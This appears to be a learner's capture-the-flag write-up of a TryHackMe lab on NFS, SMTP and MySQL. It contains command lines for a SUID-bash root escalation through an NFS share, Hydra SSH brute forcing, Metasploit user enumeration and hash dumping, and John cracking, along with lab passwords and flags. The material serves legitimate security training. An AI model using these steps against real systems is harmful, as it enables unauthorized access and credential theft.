> Network Services 2

# Nmap

nmap -sC -sC -A -Pn -vv -p- 10.10.44.48

```
22/tcp    open  ssh      syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 73:92:8e:04:de:40:fb:9c:90:f9:cf:42:70:c8:45:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEQIafB/d+8xhCVa/WJUjV/xtzU7h9fmdPMEVWEobVN59eusBnBD19rp08xrjFOkvHdLSe3XCaDSSreOd4m9If73vzGT/dpXO4kj2Je+p2ALDLLr0vbA+/EVrFJjsbKJ6OLNWGw2nD6romEld++MLOI0SbY9zaM3ov4hwQZ2Fnp9QF5OAt3zqIyxk5Xr99gpm/i4mk3YtA+3I1WHpdLE5Uw41aOVYapowLh+sG1Uyi8dxnI7WJ04DywrUftJam/ajlY6QAiWDR96QRw7RuNJ+8dOLDj7JT+aNREvSTrSWahn+clpIwCgDuVUYy36BEfyTpC/JyTtuS077Bj8vv8NLl
|   256 6d:63:d6:b8:0a:67:fd:86:f1:22:30:2b:2d:27:1e:ff (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIL2RAJwSBEjlVNFa6km4BnXrbfxBqanFGsc8V7KPraGwGaJkBCtaUpVRQmPXQHhNePswl4UI2rsxVLcw/DYQ4s=
|   256 bd:08:97:79:63:0f:80:7c:7f:e8:50:dc:59:cf:39:5e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINqYlGyJzySWsOMejWbc9mf3mFzerVbrty8i6PCOR7lv
111/tcp   open  rpcbind  syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      37126/udp   mountd
|   100005  1,2,3      40529/tcp6  mountd
|   100005  1,2,3      48993/tcp   mountd
|   100005  1,2,3      54603/udp6  mountd
|   100021  1,3,4      36045/tcp6  nlockmgr
|   100021  1,3,4      42523/tcp   nlockmgr
|   100021  1,3,4      50619/udp6  nlockmgr
|   100021  1,3,4      51812/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl syn-ack 3 (RPC #100227)
36707/tcp open  mountd   syn-ack 1-3 (RPC #100005)
39085/tcp open  mountd   syn-ack 1-3 (RPC #100005)
42523/tcp open  nlockmgr syn-ack 1-4 (RPC #100021)
48993/tcp open  mountd   syn-ack 1-3 (RPC #100005)
```

# NFS

showmount -e 10.10.44.48

```
Export list for 10.10.44.48:
/home *
```

sudo mount -t nfs 10.10.44.48:home /tmp/mount/ -nolock => We have mount /home to /tmp/mount.
We can't open the .ssh directory but we can copy it ot differnt localtion.

ssh -i id_rsa cappucino@10.10.44.48

We are in!!

What is root_squash?

By default, on NFS shares- Root Squashing is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume. Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges. Not what we want. However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system. 

Method

We're able to upload files to the NFS share, and control the permissions of these files. We can set the permissions of whatever we upload, in this case a bash shell executable. We can then log in through SSH, as we did in the previous task- and execute this executable to gain a root shell!

# Steps

1. Download given bash binary.
2. sudo chown root bash
3. sudo cp /home/n00bmast3r/TryHackMe/Network_Services_2/bash /tmp/mount/cappucino
4. sudo chmod +xs bash => add the SUID bit permission to the bash executable
5. (SSH) ./bash -p => We are root!

# root.txt

```
THM{nfs_got_pwned}
```

# SMTP

## Enumerating Users from SMTP

The SMTP service has two internal commands that allow the enumeration of users: VRFY (confirming the names of valid users) and EXPN (which reveals the actual address of user’s aliases and lists of e-mail (mailing lists). 

# Metasploit Enum modules for SMTP

1. smtp_version
2. smtp_enum

# Nmap

nmap -sC -sV -Pn -A -T4 -vvv -p- 10.10.27.51

```
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
25/tcp open  smtp    syn-ack Postfix smtpd
|_smtp-commands: polosmtp.home, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=polosmtp
| Subject Alternative Name: DNS:polosmtp
| Issuer: commonName=polosmtp
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-04-22T18:38:06
| Not valid after:  2030-04-20T18:38:06
| MD5:   5c21 92bb 0da5 82d6 7b45 a851 7651 7137
| SHA-1: eb6c 0d88 57e6 8ba7 8308 aac8 9c34 0836 d2a1 c133
```

# Metasploit smtp version

## auxiliary/scanner/smtp/smtp_version 

```
[+] 10.10.27.51:25        - 10.10.27.51:25 SMTP 220 polosmtp.home ESMTP Postfix (Ubuntu)\x0d\x0a
[*] 10.10.27.51:25        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
# Metasloit SMTP Enum

auxiliary/scanner/smtp/smtp_enum 

```
[*] 10.10.27.51:25        - 10.10.27.51:25 Banner: 220 polosmtp.home ESMTP Postfix (Ubuntu)
[+] 10.10.27.51:25        - 10.10.27.51:25 Users found: administrator
[*] 10.10.27.51:25        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Let's use hydar to crack SSH.

# Hydra

hydra -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.27.51 ssh

```
[22][ssh] host: 10.10.27.51   login: administrator   password: alejandro
```

We are in as administrator.

# smtp.txt

```
THM{who_knew_email_servers_were_c00l?}
```

# MySQL

**Given Credentials: `root`:`password`**

mysql -h 10.10.23.35 -u root -p

# Metasploit

auxiliary/admin/mysql/mysql_sql

```
msf6 auxiliary(admin/mysql/mysql_sql) > run
[*] Running module against 10.10.23.35

[*] 10.10.23.35:3306 - Sending statement: 'select version()'...
[*] 10.10.23.35:3306 -  | 5.7.29-0ubuntu0.18.04.1 |
[*] Auxiliary module execution completed
```

set SQL 'show databases'

```
[*] 10.10.23.35:3306 -  | information_schema |
[*] 10.10.23.35:3306 -  | mysql |
[*] 10.10.23.35:3306 -  | performance_schema |
[*] 10.10.23.35:3306 -  | sys |
```

# Dumping Schema

auxiliary/scanner/mysql/mysql_schemadump => Dumps whole schema/database.

# /auxiliary/scanner/mysql/mysql_hashdump => Dumps hashes

```
[+] 10.10.23.35:3306      - Saving HashString as Loot: root:
[+] 10.10.23.35:3306      - Saving HashString as Loot: mysql.session:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.23.35:3306      - Saving HashString as Loot: mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.23.35:3306      - Saving HashString as Loot: debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
[+] 10.10.23.35:3306      - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
[+] 10.10.23.35:3306      - Saving HashString as Loot: carl:*EA031893AA21444B170FC2162A56978B8CEECE18
```

# Cracking carl's password with john

john hash.txt

```
doggie           (carl)
```

We can login through SSH as Carl.

# MySQL.txt 

```
THM{congratulations_you_got_the_mySQL_flag}
```